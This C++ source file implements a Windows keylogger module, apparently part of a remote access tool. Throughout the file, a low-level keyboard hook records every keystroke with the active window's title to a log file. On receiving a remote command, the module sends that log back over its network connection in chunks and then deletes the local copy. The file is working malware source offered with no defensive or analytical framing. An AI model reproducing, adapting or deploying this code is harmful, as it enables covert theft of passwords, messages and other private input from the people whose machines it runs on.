#include <Windows.h>
#include "keylogger.h"

Keylogger* currentKeyloggerObj = NULL;

//Dispatch windows
void DispatchHook(Keylogger* KeyloggerObj)
{
	KeyloggerObj->InstallHook();
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	KeyloggerObj->UnInstallHook();
}

//Some functions
void GetActualKeyboardState(unsigned char *keyboardState)
{
    for (int i = 0; i < 256; ++i)
        keyboardState[i] = GetKeyState(i);
}

//Our hook proc
LRESULT CALLBACK WrapOurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept key presses
{
	return OurKeyBoardProc(currentKeyloggerObj, nCode, wparam, lparam);
}

LRESULT OurKeyBoardProc(Keylogger* KeyloggerObj, int nCode, WPARAM wparam, LPARAM lparam)
{
	// wparam - key type, lparam - type of KBDLLHOOKSTRUCT
	if (nCode < 0)
		CallNextHookEx(KeyloggerObj->eHook, nCode, wparam, lparam);

	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // check when key is pressed down or hold
	{
		unsigned char keyboardState[256];
        GetActualKeyboardState(keyboardState);

		switch(kbs->vkCode)
		{
			case VK_DELETE:		KeyloggerObj->WriteLog(L"[Del]");			break;
			case VK_RETURN:		KeyloggerObj->WriteLog(L"[Enter]\r\n");		break;
			case VK_TAB:		KeyloggerObj->WriteLog(L"[Tab]");			break;
			case VK_BACK:		KeyloggerObj->WriteLog(L"[Backspace]");		break;

			default:
				{
					wchar_t buffer[16];
					ZeroMemory(buffer, sizeof(buffer));

					int result = ToUnicodeEx(kbs->vkCode, kbs->scanCode, keyboardState, buffer, 16, 0, KeyloggerObj->keyboardLayout);
					if (result > 0)
						KeyloggerObj->WriteLog(buffer);
				}
		}
	}

	return CallNextHookEx(KeyloggerObj->eHook, nCode, wparam, lparam);
}

Keylogger::Keylogger(Connection* mConnObj, WCHAR* mlogPath)
{
	ConnObj = mConnObj;
	ExpandEnvironmentStrings(mlogPath, logPath, MAX_PATH);
}

Keylogger::~Keylogger(){}

bool Keylogger::SetupLogFile()
{
	bool isFileExist = false;

	//reset window tittle log
	oldhWnd = NULL;

	if (GetFileAttributes(logPath) != INVALID_FILE_ATTRIBUTES)
		isFileExist = true;

	hLog = CreateFile(logPath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLog == INVALID_HANDLE_VALUE)
		return false;

	if (isFileExist)
		return true;

	BYTE header[2] = {0xFF, 0xFE};
	DWORD dwBytesWritten;
	return (WriteFile(hLog, header, 2, &dwBytesWritten, NULL) && WriteFile(hLog, KEYLOGGER_LOGHEADER, sizeof(KEYLOGGER_LOGHEADER) - 2, &dwBytesWritten, NULL));
}

bool Keylogger::WriteLog(WCHAR* text)
{
	newhWnd = GetForegroundWindow();
	DWORD dwBytesWritten;

	if (newhWnd != oldhWnd)
	{
		oldhWnd = newhWnd;
		WCHAR windowTittle[512];
		WCHAR dataToWrite[550];
		GetWindowText(newhWnd, windowTittle, sizeof(windowTittle));
		wsprintf(dataToWrite, L"\r\n\r\n..::[%s]::..\r\n", windowTittle);
		WriteFile(hLog, dataToWrite, wcslen(dataToWrite)*2, &dwBytesWritten, NULL);
	}
	return WriteFile(hLog, text, wcslen(text)*2, &dwBytesWritten, NULL);
}

bool Keylogger::CloseLog()
{
	bool ret;
	if (hLog)
	{
		ret = CloseHandle(hLog);
		hLog = NULL;
	}
	return ret;
}

bool Keylogger::InstallHook()
{
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)WrapOurKeyBoardProc, GetModuleHandle(NULL), 0);
	return (eHook != NULL);
}

bool Keylogger::UnInstallHook()
{
	if (eHook)
	{
		UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return true;
	}
	return false;
}

bool Keylogger::Start()
{
	return (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DispatchHook, this, NULL, NULL) != NULL);
}

bool Keylogger::Stop()
{
	UnInstallHook();
	return true;
}

void Keylogger::OnInit()
{
	//Set up Obj ID
	objID = 2;

	//Set up some messy thing
	currentKeyloggerObj = this;
	oldhWnd = NULL;
	newhWnd = NULL;
	keyboardLayout = GetKeyboardLayout(0);

	//Setup log and hook
	SetupLogFile();
}

void Keylogger::OnPacketArrived(BYTE* PacketData, size_t Size)
{
	switch (PacketData[0])
	{
	case KEYLOGGER_GETLOG:
		{
			if (!CloseLog())
				return;

			HANDLE hLogRead = CreateFile(logPath, FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hLogRead != INVALID_HANDLE_VALUE)
			{
				DWORD fileSize = GetFileSize(hLogRead, NULL);
				DWORD sizeLeft = fileSize;
				BYTE* chunk = (BYTE*)malloc(0x1000 + sizeof(KeylogHeader));
				ZeroMemory(chunk, 0x1000 + sizeof(KeylogHeader));
				while(sizeLeft)
				{
					DWORD readSize;
					DWORD dwBytesRead;
					if (sizeLeft < 0x1000)
						readSize = sizeLeft;
					else
						readSize = 0x1000;
					ReadFile(hLogRead, chunk + sizeof(KeylogHeader), readSize, &dwBytesRead, NULL);
					sizeLeft -= readSize;

					//Build header
					KeylogHeader* Header = (KeylogHeader*) chunk;
					Header->ID = KEYLOGGER_GETLOG;
					Header->chunkSize = readSize;
					Header->sizeLeft = sizeLeft;
					Header->totalSize = fileSize;

					SendPacket(chunk, readSize + sizeof(KeylogHeader));
				}
				CloseHandle(hLogRead);
				DeleteFile(logPath);
				SetupLogFile();
			}
			break;
		}
	}
}

void Keylogger::OnExit()
{
	CloseLog();
	UnInstallHook();
}